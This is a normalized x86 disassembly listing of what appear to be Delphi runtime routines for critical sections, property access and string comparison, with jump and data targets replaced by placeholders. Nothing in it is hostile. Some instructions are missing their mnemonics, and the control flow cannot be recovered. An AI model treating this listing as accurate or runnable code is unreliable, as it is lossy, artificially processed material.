mov ebx eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
test al al
je r-xdata
mov eax ebx
call sub_422a30
movzx eax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4225fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_422a30
lea edx [ ebp - 0xc ]
movzx eax [ esi ]
call sub_422ab0
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422650
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx eax [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
movzx eax [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_422688
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_422a30
movzx eax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4226c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx ecx [ rw-data ]
xor edx edx
mov eax esi
call sub_422708
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_422708
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422958
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4055c0
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_422929
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x11
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_408754
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422930
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_408754
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0x11
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x40 ]
call sub_4054c8
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x11
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x11
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_422930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42295f
lea eax [ ebp - 0x44 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x24 ]
mov edx 0x3
call j_sub_4068c4
retn
sub_42295f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_422984
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_405bb4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4229e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229ee
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_422a88
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4056b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_422ab0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_422b58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_408754
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_422b6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422c2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_422c11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40875c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c18
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_4054c8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_4110d4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_422c58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422cc7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422cce
retn
call sub_42254c
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_41c29c
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_407e40
mov eax rw-data
mov edx [ r-xdata ]
call sub_408928
sub_422f48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_422f8c
push [ fs : edx ]
mov [ fs : edx ] esp
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a15c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f93
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_422fa4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423078
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_422f98
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_422f98
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_411914
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_4070a8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4110d4
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42307f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
lea edx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_410df8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4070a8
jmp r-xdata
add eax 0xd
test ebx ebx
je r-xdata
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a15c
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_4070a8
movzx edx [ eax ]
inc edx
add eax edx
dec ebx
test ebx ebx
jne r-xdata
sub_42309c
push ebx
push esi
add esp 0xfffff800
mov esi edx
push 0x200
lea edx [ esp + 0x4 ]
push edx
movzx edx [ eax ]
push edx
inc eax
push eax
push 0x0
push 0xfde9
call MultiByteToWideChar
mov ebx eax
push 0x200
lea eax [ esp + 0x404 ]
push eax
push 0xffffffff
push esi
push 0x0
push 0xfde9
call MultiByteToWideChar
mov esi eax
push esi
lea eax [ esp + 0x404 ]
push eax
push ebx
lea eax [ esp + 0xc ]
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call __imp_CompareStringW
cmp eax 0x2
sete al
add esp 0x800
pop esi
pop ebx
retn
sub_423110
push ebx
push esi
push edi
push 0x0
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
test [ esp ] 0x1
jne r-xdata
movzx ecx [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
push eax
push edx
mov eax esi
call sub_42309c
test al al
pop edx
pop eax
jne r-xdata
mov bl [ ecx + edx - 0x1 ]
test bl 0x80
jne r-xdata
pop edi
pop edi
pop esi
pop ebx
retn
movzx ecx [ esi ]
mov [ esp ] 0x1
xor bl [ ecx + esi ]
test bl 0x80
jne r-xdata
test bl 0xdf
jne r-xdata
dec ecx
jne r-xdata
jmp r-xdata
sub_423188
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423220
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_422f98
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_411b70
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_409ed8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423110
mov ebx eax
mov edx [ rw-data ]
mov eax esi
call sub_4110d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423227
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov edx [ rw-data ]
mov eax esi
call sub_4110d4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_411b70
mov ebx eax
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
sub_423230
push ebx
push esi
push edi
push 0x0
test eax eax
je r-xdata
pop edi
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
push eax
push edx
lea eax [ eax + 0x1a ]
call sub_42309c
pop edx
mov cl [ edx - 0x4 ]
test al al
pop eax
je r-xdata
mov bx [ eax + 0x1a ]
test bh 0x80
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
test ch 0x80
jne r-xdata
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov [ esp ] 0x1
and ecx 0xdfff
and bh 0xdf
cmp ebx ecx
je r-xdata
test [ esp ] 0x1
jne r-xdata
mov bh 0x0
xor ch [ eax + ebx + 0x1a ]
test ch 0x80
jne r-xdata
test ch 0xdf
jne r-xdata
dec ebx
jne r-xdata
mov ch [ ebx + edx - 0x1 ]
test ch 0x80
jne r-xdata
jmp r-xdata
sub_4232e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423329
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_409ed8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423230
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423330
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_423338
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_42338c
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4233bc
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_423430
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_42348c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423500
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
dec al
je r-xdata
mov edx edi
mov eax esi
call sub_411914
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423507
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_411914
mov ecx [ ebp - 0x4 ]
mov eax edi
mov edx r-xdata
call sub_407564
jmp r-xdata
sub al 0x7
je r-xdata
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_422fa4
sub_423520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4235e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_422f98
mov esi [ eax + 0x1 ]
movzx eax [ ebx ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_411b70
mov ebx eax
sub ebx esi
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4235e9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub al 0x7
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4077d0
mov eax [ ebp - 0x8 ]
call sub_411b70
mov ebx eax
sub ebx esi
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423188
mov ebx eax
sub_4235f4
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_423638
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_42368c
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_4235f4
mov eax ebx
mov edx esp
mov ecx 0x0
call sub_406b88
add esp 0x100
pop ebx
retn
sub_4236bc
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_406bb0
mov ecx esp
mov edx esi
mov eax ebx
call sub_423638
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_423708
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_4236f0
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_423748
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4236f0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_423788
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4237d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_423978
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx 0x0
call sub_406b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237dc
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
sub_4237e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42382c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_406ef4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_423a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423833
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
sub_42383c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423889
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_423b88
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx 0x0
call sub_4072d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423890
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_423898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4238e0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4072ac
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_423df4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238e7
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4238f0
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
movzx ecx [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_42368c
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_423708
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_423788
pop ebx
retn
sub cl 0x7
je r-xdata
mov ecx ebx
call sub_42383c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_4068a0
pop ebx
retn
sub_42393c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
movzx ebx [ ebx ]
sub bl 0x5
je r-xdata
call sub_4236bc
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_423748
pop ebx
retn
dec bl
je r-xdata
call sub_4237e4
pop ebx
retn
sub bl 0x7
je r-xdata
call sub_423898
jmp r-xdata
pop ebx
retn
sub_423978
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423a7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423b88
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40730c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a85
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
sub al 0x7
je r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx [ ebp - 0x8 ]
mov eax esi
mov edx [ ebx ]
call sub_406d90
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423b88
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40730c
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
call sub_406d54
mov ecx esi
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
jmp r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x10 ] 0x80000000
jne r-xdata
sub_423a8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423b7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
